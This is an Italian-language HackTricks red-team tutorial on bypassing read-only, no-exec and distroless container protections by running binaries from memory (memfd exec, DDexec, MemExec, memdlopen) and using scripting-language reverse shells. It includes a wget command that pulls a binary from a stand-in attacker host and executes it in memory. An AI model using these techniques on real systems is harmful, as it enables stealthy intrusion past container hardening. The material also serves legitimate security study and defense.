# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se sei interessato a una **carriera nell'hacking** e a hackare l'inhackabile - **stiamo assumendo!** (_richiesta di polacco fluente scritto e parlato_).

{% embed url="https://www.stmcyber.com/careers" %}

## Video

Nei seguenti video puoi trovare le tecniche menzionate in questa pagina spiegate più in dettaglio:

* [**DEF CON 31 - Esplorare la manipolazione della memoria Linux per stealth e evasione**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusioni stealth con DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## scenario read-only / no-exec

È sempre più comune trovare macchine linux montate con **protezione del file system in sola lettura (ro)**, specialmente nei container. Questo perché eseguire un container con file system ro è facile come impostare **`readOnlyRootFilesystem: true`** nel `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Tuttavia, anche se il file system è montato come ro, **`/dev/shm`** sarà comunque scrivibile, quindi è falso che non possiamo scrivere nulla nel disco. Tuttavia, questa cartella sarà **montata con protezione no-exec**, quindi se scarichi un binario qui **non sarai in grado di eseguirlo**.

{% hint style="warning" %}
Da una prospettiva di red team, questo rende **complicato scaricare ed eseguire** binari che non sono già nel sistema (come backdoor o enumeratori come `kubectl`).
{% endhint %}

## Bypass più semplice: Script

Nota che ho menzionato i binari, puoi **eseguire qualsiasi script** purché l'interprete sia all'interno della macchina, come uno **script shell** se `sh` è presente o uno **script python** se `python` è installato.

Tuttavia, questo non è sufficiente per eseguire la tua backdoor binaria o altri strumenti binari che potresti aver bisogno di eseguire.

## Bypass in memoria

Se vuoi eseguire un binario ma il file system non lo consente, il modo migliore per farlo è **eseguirlo dalla memoria**, poiché le **protezioni non si applicano lì**.

### Bypass FD + exec syscall

Se hai alcuni potenti motori di script all'interno della macchina, come **Python**, **Perl** o **Ruby**, potresti scaricare il binario da eseguire dalla memoria, memorizzarlo in un descrittore di file in memoria (`create_memfd` syscall), che non sarà protetto da quelle protezioni e poi chiamare una **`exec` syscall** indicando il **fd come file da eseguire**.

Per questo puoi facilmente usare il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puoi passargli un binario e genererà uno script nel linguaggio indicato con il **binario compresso e codificato in b64** con le istruzioni per **decodificarlo e decomprimerlo** in un **fd** creato chiamando la syscall `create_memfd` e una chiamata alla syscall **exec** per eseguirlo.

{% hint style="warning" %}
Questo non funziona in altri linguaggi di scripting come PHP o Node perché non hanno alcun **modo predefinito per chiamare syscall raw** da uno script, quindi non è possibile chiamare `create_memfd` per creare il **memory fd** per memorizzare il binario.

Inoltre, creare un **fd regolare** con un file in `/dev/shm` non funzionerà, poiché non ti sarà permesso eseguirlo a causa della **protezione no-exec** che si applicherà.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) è una tecnica che ti consente di **modificare la memoria del tuo stesso processo** sovrascrivendo il suo **`/proc/self/mem`**.

Pertanto, **controllando il codice assembly** che viene eseguito dal processo, puoi scrivere un **shellcode** e "mutare" il processo per **eseguire qualsiasi codice arbitrario**.

{% hint style="success" %}
**DDexec / EverythingExec** ti permetterà di caricare e **eseguire** il tuo **shellcode** o **qualsiasi binario** dalla **memoria**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Per ulteriori informazioni su questa tecnica controlla il Github o:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è il passo naturale successivo di DDexec. È un **DDexec shellcode demonizzato**, quindi ogni volta che vuoi **eseguire un binario diverso** non è necessario rilanciare DDexec, puoi semplicemente eseguire il shellcode di memexec tramite la tecnica DDexec e poi **comunicare con questo demone per passare nuovi binari da caricare ed eseguire**.

Puoi trovare un esempio su come usare **memexec per eseguire binari da una reverse shell PHP** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con uno scopo simile a DDexec, la tecnica [**memdlopen**](https://github.com/arget13/memdlopen) consente un **modo più semplice per caricare binari** in memoria per eseguirli successivamente. Potrebbe anche consentire di caricare binari con dipendenze.

## Bypass Distroless

### Cos'è distroless

I container distroless contengono solo i **componenti minimi necessari per eseguire un'applicazione o un servizio specifico**, come librerie e dipendenze di runtime, ma escludono componenti più grandi come un gestore di pacchetti, shell o utilità di sistema.

L'obiettivo dei container distroless è **ridurre la superficie di attacco dei container eliminando componenti non necessari** e minimizzando il numero di vulnerabilità che possono essere sfruttate.

### Reverse Shell

In un container distroless potresti **non trovare nemmeno `sh` o `bash`** per ottenere una shell regolare. Non troverai nemmeno binari come `ls`, `whoami`, `id`... tutto ciò che di solito esegui in un sistema.

{% hint style="warning" %}
Pertanto, **non** sarai in grado di ottenere una **reverse shell** o **enumerare** il sistema come fai di solito.
{% endhint %}

Tuttavia, se il container compromesso sta eseguendo ad esempio un'app web Flask, allora Python è installato, e quindi puoi ottenere una **reverse shell Python**. Se sta eseguendo Node, puoi ottenere una reverse shell Node, e lo stesso vale per quasi qualsiasi **linguaggio di scripting**.

{% hint style="success" %}
Utilizzando il linguaggio di scripting potresti **enumerare il sistema** utilizzando le capacità del linguaggio.
{% endhint %}

Se non ci sono protezioni **`read-only/no-exec`** potresti abusare della tua reverse shell per **scrivere nel file system i tuoi binari** e **eseguirli**.

{% hint style="success" %}
Tuttavia, in questo tipo di container queste protezioni di solito esistono, ma potresti utilizzare le **tecniche di esecuzione in memoria precedenti per bypassarle**.
{% endhint %}

Puoi trovare **esempi** su come **sfruttare alcune vulnerabilità RCE** per ottenere reverse shell di linguaggi di scripting ed eseguire binari dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se sei interessato a una **carriera nel hacking** e a hackare l'inhackabile - **stiamo assumendo!** (_richiesta di polacco fluente scritto e parlato_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Impara e pratica Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
